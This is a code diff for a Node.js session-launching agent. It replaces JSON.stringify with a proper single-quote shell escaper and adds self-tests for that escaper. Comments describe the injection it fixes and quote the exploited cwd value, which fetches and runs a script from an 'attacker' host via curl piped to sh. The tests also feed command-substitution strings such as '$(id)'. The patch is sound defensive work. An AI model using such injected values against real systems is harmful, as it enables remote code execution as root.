@@ -103,7 +103,24 @@ if (process.argv.includes('--self-test')) {
   assert.notEqual(missionManifestHmac('secret', manifest), missionManifestHmac('other', manifest));
   assert.equal(isLoopbackHost('127.0.0.1'), true);
   assert.equal(isLoopbackHost('0.0.0.0'), false);
+  // Shell quoting. `JSON.stringify` was used here and leaves `$` and backtick
+  // live inside the double-quoted `bash -lc` string: a session request with
+  // cwd `/tmp/x$(curl -s http://attacker/p|sh)` ran as root on this box.
+  assert.equal(shq("/tmp/x"), "'/tmp/x'");
+  assert.equal(shq("/tmp/x$(id)"), "'/tmp/x$(id)'");
+  assert.equal(shq("/tmp/x`id`"), "'/tmp/x`id`'");
+  assert.equal(shq("/tmp/it's"), "'/tmp/it'\\''s'");
+  for (const evil of ['/tmp/x$(id)', '/tmp/x`id`', '/tmp/x"; id; "', "/tmp/x'; id; '"]) {
+    const quoted = shq(evil);
+    // Everything between the outer quotes must be inert: the only single quote
+    // allowed inside is the closing/reopening dance.
+    assert.ok(quoted.startsWith("'") && quoted.endsWith("'"), `not wrapped: ${quoted}`);
+    assert.ok(!/[^\\]'[^\\]/.test(quoted.slice(1, -1).replaceAll("'\\''", '')),
+      `unescaped quote survives in ${quoted}`);
+  }
+
   console.log('throttle edge mission contract: ok');
+  console.log('throttle edge shell quoting: ok');
   process.exit(0);
 }
 
@@ -258,8 +275,20 @@ function persistOAuthToken(tok) {
   fs.chmodSync(OAUTH_TOKEN_PATH, 0o600);
 }
 
+/// Single-quote a value for POSIX sh. Inside single quotes nothing expands, so
+/// this is the only safe way to put an attacker-influenced string into a shell
+/// command line.
+///
+/// `JSON.stringify` was used for this and is NOT equivalent: it escapes `"` and
+/// `\\` but leaves `$` and backtick untouched, and the result landed inside
+/// DOUBLE quotes where command substitution is still live. A session request
+/// with cwd `/tmp/x$(curl -s http://attacker/p|sh)` executed as root on the box.
+function shq(value) {
+  return `'${String(value).replaceAll("'", "'\\''")}'`;
+}
+
 function oauthShellPrefix() {
-  const file = `'${OAUTH_TOKEN_PATH.replaceAll("'", "'\\''")}'`;
+  const file = shq(OAUTH_TOKEN_PATH);
   return `if [ -r ${file} ]; then CLAUDE_CODE_OAUTH_TOKEN="$(cat ${file})"; export CLAUDE_CODE_OAUTH_TOKEN; fi;`;
 }
 
@@ -423,14 +452,14 @@ async function startSession({ project, cwd, resume, runtime }) {
   const bin = kind === 'codex' ? CODEX_CMD : CLAUDE_CMD;
   const launch = resume
     ? (kind === 'codex'
-        ? `${bin} resume ${JSON.stringify(resume)}`
-        : `${bin} --resume ${JSON.stringify(resume)}`)
+        ? `${bin} resume ${shq(resume)}`
+        : `${bin} --resume ${shq(resume)}`)
     : bin;
   // mkdir -p the cwd first: an offloaded session names a project dir that may not
   // exist yet on this box (the Mac had it, we don't). Without this `cd` fails and
   // the tmux session dies on launch — the transcript was uploaded but claude never
   // starts. Creating it is the sane "run a session here" behaviour.
-  const inner = `mkdir -p ${JSON.stringify(cwd)} && cd ${JSON.stringify(cwd)} && ${oauthShellPrefix()} exec ${launch}`;
+  const inner = `mkdir -p ${shq(cwd)} && cd ${shq(cwd)} && ${oauthShellPrefix()} exec ${launch}`;
   // Spawn the tmux server in its OWN transient systemd scope, NOT in this agent's
   // service cgroup. Under systemd, a tmux server forked directly by the agent lives
   // in throttle-agent.service's control group and gets reaped almost immediately
